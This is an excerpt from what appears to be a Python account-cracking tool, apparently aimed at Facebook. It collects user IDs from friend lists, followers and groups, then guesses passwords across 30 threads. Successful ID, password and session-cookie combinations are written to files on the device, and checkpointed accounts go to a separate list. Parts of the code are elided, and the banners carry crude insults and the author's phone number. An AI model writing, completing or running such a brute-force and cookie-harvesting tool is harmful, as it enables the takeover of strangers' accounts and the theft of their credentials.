...
\t░░░██║░░░╚█████╔╝╚██████╔╝██║░░░░░██║░╚═██╔═╝░
\t░░░╚═╝░░░░╚════╝░░╚═════╝░╚═╝░░░░░╚═╝░░░╚═╝░░░    	
			{m}•{k}•{h}•{sir} Author : TOUFIQ_AHMED {x}{m}•{k}•{h}•{x}''')
			{m}•{k}•{h}•{sir} Whatapp: +8801812027446 {x}{m}•{k}•{h}•{x}''')
#--------------------[ PARTS-IN ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Saran Extension : [green]Cookie Dough[white] ©©©'))
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Execute the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWelcome [green]%s[white] Ngentod'%(my_name)))
...
#-----------------[ RESULT-CRACK ]-----------------#
def result():
	print('>> Your OK result ')
	print('>> Your CP result ')
	print('>> Return	')
	kz = input('\n>> Select : ')
	if kz in ['1','01']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> How much do you want to target ? : '))
	except ValueError:
		print('>> Enter Dog Numbers, Even Letters ')
		exit()
	if jum<1 or jum>100:
	...
	try:
		print('')
		print(f'>> Total Id Accumulated🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Signal Lo kek cock ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendlist Not Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-FOLLOWERS ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('>> Ketik ( me ) If you want to crack your own followers ')
...
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> Enter Group Id :\x1b[1;94m ")
...
def setting():
	...
	if hu in ['1','01']:
		...
		print('>> Choose the Right Kontooll ')
		exit()
	print('>> 1. Mobile ')
#	print('>> 2. Mbasic ')
#	print('>> 3. Touch  ')
...
#		method.append('touch')
		...
		method.append('mobile')
	print('')
#	_jembot_ = input('>> Add Related Apps ( Y/t ) ')
#	if _jembot_ in ['']:
#		print('>> Choose the Right Cock ')
#		back()
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Enter Password Additional Minimum 6 Character\n[[cyan]•[white]] Example :[green] brother, fuck, sister[white] '))
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Complete, Jangan Lupa Bersyukur[cyan] <<[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Good Bye Toufiq Cloner{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/TOUFIQ-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/TOUFIQ-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
